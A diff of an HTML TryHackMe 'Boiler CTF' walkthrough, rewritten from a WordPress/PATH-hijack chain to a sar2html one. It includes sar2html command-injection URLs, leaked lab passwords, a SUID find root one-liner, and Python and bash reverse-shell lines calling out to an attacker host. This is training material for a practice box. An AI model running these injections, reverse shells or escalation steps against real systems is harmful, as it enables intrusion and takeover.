@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Boiler CTF: WordPress plugin RCE to a SUID binary root shell</title>
-  <meta name="description" content="A TryHackMe Boiler CTF walkthrough: brute-forcing a WordPress login, exploiting a vulnerable plugin for code execution, and escalating to root through a custom SUID binary with a hijackable PATH.">
+  <title>Boiler CTF: a sar2html RCE to a SUID find root shell</title>
+  <meta name="description" content="A TryHackMe Boiler CTF walkthrough: wading through deliberate rabbit holes to a real sar2html remote code execution bug, credential reuse through a backup script, and a SUID find binary abused via GTFOBins.">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
   <link rel="stylesheet" href="../assets/style.css">
 </head>
@@ -12,17 +12,17 @@
 <div class="page">
 
   <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
-  <h1>Boiler CTF: WordPress plugin RCE to a SUID binary root shell</h1>
-  <p class="dek">A WordPress login brute-forced, a vulnerable plugin turned into a reverse shell, and root reached through a custom SUID binary that trusts whatever's first on the PATH.</p>
+  <h1>Boiler CTF: a sar2html RCE to a SUID find root shell</h1>
+  <p class="dek">This room buries the real path behind a pile of deliberate decoys, a Joomla login not worth brute-forcing, an FTP file that goes nowhere, an encoded robots.txt. The actual way in is a years-old remote code execution bug in a monitoring tool called sar2html, reached through a Joomla subdirectory, which leaks SSH credentials straight out of a log file.</p>
 
   <div class="meta-row">
     <span class="pill">Room: Boiler CTF</span>
     <span class="pill">Category: Web / Linux Privesc</span>
-    <span class="pill">Tools: WPScan, Gobuster, John the Ripper</span>
+    <span class="pill">Tools: gobuster, sar2html RCE, linpeas, GTFOBins</span>
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> a WordPress site with a weak admin password and an outdated plugin. The job: get a shell through the application layer, then find a path from a low-privilege web user to root.</p>
+    <p><strong>The setup:</strong> an Apache/Joomla box with a known-vulnerable reporting tool exposed in a subdirectory, and a chain of reused credentials sitting underneath it. The job: find the one real path through a room built to waste time on the wrong ones.</p>
   </div>
 
   <section>
@@ -32,12 +32,27 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Enumerate the WordPress install</div>
-          <p><code>wpscan</code> against the site enumerates the theme, plugin list, and usernames. One installed plugin is a known-vulnerable version with a public code-execution advisory.</p>
-          <pre><code>wpscan --url http://&lt;target&gt; -e vp,u</code></pre>
+          <div class="step-title">Scan, then map the web root</div>
+          <pre><code>PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_http-title: Apache2 Ubuntu Default Page: It works
+10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
+55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</code></pre>
+          <p>A directory scan against port 80 finds two real subdirectories worth following:</p>
+          <pre><code>/.htpasswd             (Status: 403)
+/.hta                   (Status: 403)
+/.htaccess              (Status: 403)
+/index.html             (Status: 200)
+/joomla                 (Status: 301)
+/manual                 (Status: 301)
+/robots.txt             (Status: 200)
+/server-status          (Status: 403)</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>WordPress's plugin ecosystem is its biggest attack surface, far more than WordPress core itself. Enumerating installed plugins and matching their versions against known CVEs is usually faster than looking for a novel bug.</p>
+            <p>Four open services (FTP, two web ports, SSH on a nonstandard port) is a lot of surface. Mapping the directory structure of the one serving real content first is what turns "four services" into "one subdirectory worth investigating."</p>
           </div>
         </div>
       </div>
@@ -45,12 +60,13 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Brute-force the admin login</div>
-          <p>With a valid username in hand, <code>wpscan</code>'s password-brute-force mode against a common wordlist finds a weak admin password in short order.</p>
-          <pre><code>wpscan --url http://&lt;target&gt; -U admin -P /usr/share/wordlists/rockyou.txt</code></pre>
+          <div class="step-title">Recognize the decoys and move past them</div>
+          <p>This room front-loads several dead ends on purpose. <code>robots.txt</code> discloses a pile of disallowed paths and an encoded number string that needs a shift-cipher decoder to even read, none of it leads anywhere useful. The Joomla admin login at <code>/joomla/administrator/</code> has no public exploit for its version, so brute-forcing it isn't the intended path either. FTP's anonymous login turns up an <code>.info.txt</code> file that's equally a dead end, though it's worth learning the trick for reading a file over FTP without actually downloading it:</p>
+          <pre><code>get .info.txt -</code></pre>
+          <p>(the trailing <code>-</code> prints the file's contents directly instead of saving it locally). A couple of other Joomla subpaths show more red-herring content in the same vein.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>WordPress doesn't rate-limit login attempts by default. A weak password on an admin account with no additional protection is just a matter of wordlist size and time.</p>
+            <p>A room (or a real target) that surfaces several plausible-looking paths is testing whether time gets spent chasing all of them equally, or whether effort gets redirected once a path stops producing anything concrete. <code>robots.txt</code> and anonymous FTP are both worth the first look, just not an unlimited one.</p>
           </div>
         </div>
       </div>
@@ -58,12 +74,20 @@
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Turn admin access into code execution</div>
-          <p>Logged in as admin, the WordPress theme/plugin editor accepts arbitrary PHP. Dropping a one-line reverse shell into an active plugin file and triggering it (loading the corresponding page) executes it on the server.</p>
-          <pre><code>exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1'");</code></pre>
+          <div class="step-title">Find the real vulnerable app and its public exploit</div>
+          <p>A further Joomla subdirectory serves <code>sar2html</code>, a system performance report generator. A quick search for its name turns up a public remote code execution advisory for version 3.2.1:</p>
+          <pre><code># Exploit Title: sar2html Remote Code Execution
+# Date: 01/08/2019
+# Software Link: https://sourceforge.net/projects/sar2html/
+# Version: 3.2.1
+
+In web application you will see index.php?plot url extension.
+
+http://&lt;ipaddr&gt;/index.php?plot=;&lt;command-here&gt; will execute
+the command you entered.</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>The plugin editor is, by design, a way for an admin to run arbitrary server-side code, that's indistinguishable from a code-execution vulnerability once an attacker has those credentials. Admin access to WordPress is effectively a shell waiting to happen.</p>
+            <p>sar2html's <code>plot</code> parameter gets passed straight into a shell command with no sanitization. Prefixing a second command with <code>;</code> after the expected value just chains an arbitrary command onto the one the application meant to run.</p>
           </div>
         </div>
       </div>
@@ -71,13 +95,19 @@
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Enumerate for privilege escalation</div>
-          <p>As the low-privilege web server user, a hunt for SUID binaries turns up a custom, non-standard one sitting outside the usual system binary list.</p>
-          <pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
-          <p>Running it calls out to a system command (like <code>service</code> or similar) without an absolute path.</p>
+          <div class="step-title">Confirm it, then read a log file straight into SSH creds</div>
+          <p>A quick <code>ls</code> through the parameter confirms the injection works, then reading a log file in the same directory pays off immediately:</p>
+          <pre><code>http://10.10.40.30/joomla/_test/index.php?plot=;ls
+http://10.10.40.30/joomla/_test/index.php?plot=;cat log.txt</code></pre>
+          <p>The log contains an SSH auth line with the password spelled out in a trailing comment:</p>
+          <pre><code>Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$</code></pre>
+          <p>That logs straight in over the nonstandard SSH port found in the initial scan:</p>
+          <pre><code>ssh basterd@10.10.40.30 -p55007
+basterd@10.10.40.30's password: superduperp@$$
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A custom SUID binary is always worth more scrutiny than a stock one, someone wrote it for a reason, and homegrown binaries are far more likely to make a path-handling mistake than audited system tools.</p>
+            <p>Command injection through a URL parameter is as good as a shell, reading an arbitrary file is often faster and quieter than spawning a reverse shell outright, and here it happened to land directly on a credential, no further exploitation needed.</p>
           </div>
         </div>
       </div>
@@ -85,15 +115,80 @@
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Hijack the PATH for root</div>
-          <p>Writing a malicious file with the same name as the unqualified command the SUID binary calls, placing it in a writable directory, and prepending that directory to <code>PATH</code> before running the binary gets it executed instead, as root.</p>
-          <pre><code>echo '/bin/bash' &gt; /tmp/&lt;command&gt;
-chmod +x /tmp/&lt;command&gt;
-export PATH=/tmp:$PATH
-/path/to/suid-binary</code></pre>
+          <div class="step-title">Pivot to a second user via a reused password</div>
+          <p>A backup script sitting in the current directory, readable, names a different user and embeds the same password pattern again as a comment:</p>
+          <pre><code>-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
+
+cat backup.sh
+REMOTE=1.2.3.4
+SOURCE=/home/stoner
+TARGET=/usr/local/backup
+LOG=/home/stoner/bck.log
+DATE=`date +%y\.%m\.%d\.`
+
+USER=stoner
+#superduperp@$$no1knows
+
+ssh $USER@$REMOTE mkdir $TARGET/$DATE</code></pre>
+          <p>That password, suffixed slightly differently, is <code>stoner</code>'s real login as well. Logged in as <code>stoner</code>, Joomla's own config file is readable too (a dead end here, no further use found for these particular credentials, but worth checking on any Joomla box):</p>
+          <pre><code>cat /var/www/html/joomla/configuration.php
+public $host     = '127.0.0.1';
+public $user     = 'joomlauser';
+public $password = 'passwordz';
+public $db       = 'joomladb';
+public $secret   = '5O2SmJUZB24rhcfL';</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A SUID binary runs with the file owner's privileges, root, but still resolves unqualified commands through the calling user's PATH unless it hardcodes an absolute path. Controlling PATH means controlling what "runs" when the binary calls out.</p>
+            <p>A password reused across two accounts, even with a trailing comment appended as a throwaway note, is still the same password. Scripts that automate privileged actions (backups, deploys) are a common place to find credentials left in plaintext for convenience.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Find the SUID binary with linpeas</div>
+          <pre><code>scp -P55007 linpeasv3_2.sh stoner@10.10.40.30:/tmp/linpeas.sh</code></pre>
+          <p>Among the SUID binaries it finds, one stands out from the usual system set:</p>
+          <pre><code>[+] SUID - Check easy privesc, exploits and write perms
+-rwsr-xr-x 1 root root   43K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root   39K May  7  2014 /bin/ping
+-rwsr-sr-x 1 daemon daemon 50K Jan 15 2016 /usr/bin/at
+-r-sr-xr-x 1 root root  227K Feb  8  2016 /usr/bin/find</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p><code>find</code> with the SUID bit set is one of the most immediately exploitable entries any SUID scan can turn up, it's a well-documented GTFOBins entry, not an edge case that needs custom exploitation.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">GTFOBins straight to root</div>
+          <pre><code>/usr/bin/find . -exec /bin/sh -p \; -quit
+# whoami
+root</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p><code>find</code>'s <code>-exec</code> flag runs an arbitrary command, and with the SUID bit set that command inherits root's privileges. <code>-p</code> on the spawned shell preserves that elevated privilege instead of dropping it, and GTFOBins exists precisely to catalog one-liners like this for every common SUID binary.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">8</div>
+        <div class="step-body">
+          <div class="step-title">Alternate path: skip straight to a reverse shell</div>
+          <p>Rather than manually reading files one command at a time through the <code>plot</code> parameter, the same injection can launch an interactive shell directly. With a listener running locally, a one-liner Python reverse shell pasted straight into the URL connects back immediately:</p>
+          <pre><code>http://10.10.37.31/joomla/_test/index.php?plot=;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.2.57.21",4750));[os.dup2(s.fileno(),f)for f in (0,1,2)];pty.spawn("sh")'</code></pre>
+          <pre><code>nc -lvnp 4750
+connect to [10.2.57.21] from (UNKNOWN) [10.10.37.31] 51722
+$ whoami
+www-data</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Any command injection is a reverse shell waiting to be asked for one. Reading individual files first (as in the main chain) is often preferable for a quieter footprint, but a direct shell works just as well and gets to the same place.</p>
           </div>
         </div>
       </div>
@@ -103,32 +198,39 @@ export PATH=/tmp:$PATH
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>wpscan: vulnerable plugin + valid username enumerated
-  &rarr; wpscan brute force: weak admin password found
-       &rarr; plugin editor: reverse shell planted and triggered
-            &rarr; find -perm -u=s: custom SUID binary with an unqualified PATH call
-                 &rarr; PATH hijack: malicious binary executed as root</code></pre>
+    <pre><code>nmap: FTP, HTTP, Webmin, SSH on a nonstandard port
+  &rarr; gobuster: /joomla found, robots.txt and FTP confirmed as decoys
+       &rarr; /joomla/_test: sar2html 3.2.1, known RCE via ?plot=
+            &rarr; ?plot=;cat log.txt: basterd's SSH password leaked in a log
+                 &rarr; ssh basterd@&lt;target&gt; -p55007
+                      &rarr; backup.sh: same password reused by stoner
+                           &rarr; linpeas: /usr/bin/find has the SUID bit
+                                &rarr; GTFOBins find one-liner: root</code></pre>
   </section>
 
   <section>
     <h2 class="section-title">Takeaways</h2>
     <div class="skills">
       <div class="skill">
-        <div class="skill-title">Plugins are WordPress's real attack surface</div>
-        <p>Enumerating installed plugins and checking their versions against known advisories is often faster than hunting for a new bug in WordPress core.</p>
+        <div class="skill-title">Not every disclosed path is worth chasing</div>
+        <p>This room's robots.txt and anonymous FTP access were both real findings that led nowhere. Recognizing a dead end and moving on is as much a skill as finding the real path.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Admin access equals code execution</div>
-        <p>The theme/plugin editor is a built-in path from "I have admin credentials" to "I have a shell," no additional vulnerability required.</p>
+        <div class="skill-title">Old, rarely-updated monitoring tools are common RCE sources</div>
+        <p>sar2html isn't WordPress or Joomla itself, it's a secondary tool someone installed and forgot about. Secondary, rarely-audited software is frequently where the real vulnerability sits.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Unqualified commands in SUID binaries are a classic privesc</div>
-        <p>Any privileged binary that calls another program by name instead of full path trusts the caller's PATH, and PATH is always attacker-controlled.</p>
+        <div class="skill-title">Log files and backup scripts are a credential goldmine</div>
+        <p>Both the initial foothold and the privilege pivot in this room came from reading plaintext credentials left in operational files, not from exploiting anything further.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">Check GTFOBins before writing custom exploitation</div>
+        <p>A SUID binary that appears in GTFOBins has a documented, tested one-liner. There's rarely a need to improvise once the binary's there.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via WordPress exploitation and PATH-hijack privilege escalation</footer>
+  <footer>tryhackme.com &middot; solved via sar2html RCE, credential reuse, and GTFOBins</footer>
 
 </div>
 </body>
